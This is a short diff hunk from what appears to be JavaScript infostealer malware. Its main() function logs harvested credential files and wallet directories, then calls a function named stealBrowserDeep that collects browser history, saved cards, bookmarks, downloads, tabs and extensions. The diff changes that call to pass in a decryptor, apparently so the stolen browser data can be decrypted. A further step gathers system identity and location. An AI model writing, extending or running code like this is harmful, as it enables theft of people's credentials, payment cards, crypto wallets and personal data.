@@ -633,7 +633,7 @@ function main() {
   log(`creds: ${Object.keys(report.creds.files).length} files, ${report.creds.wallets.length} wallet dirs`);
 
   log('Browser deep-dive (history / cards / bookmarks / downloads / tabs / extensions)...');
-  report.browser_deep = stealBrowserDeep();
+  report.browser_deep = stealBrowserDeep(makeDecryptor);
   log(`browser_deep: ${report.browser_deep.profiles.length} profiles`);
 
   log('System identity & location...');
